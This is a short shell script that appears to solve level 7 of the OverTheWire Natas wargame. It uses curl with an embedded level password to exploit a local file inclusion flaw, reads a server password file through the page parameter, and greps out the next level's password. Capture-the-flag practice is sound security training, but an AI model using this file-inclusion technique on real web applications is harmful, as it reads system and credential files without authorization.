#!/bin/sh

RESPONSE=$(curl --silent \
                --user natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 \
                http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8)
PASSWORD=$(echo ${RESPONSE} | grep -Po "(?<=<br> )[A-Za-z0-9]{32}")
printf "The password for natas08 is: ${PASSWORD}\n"
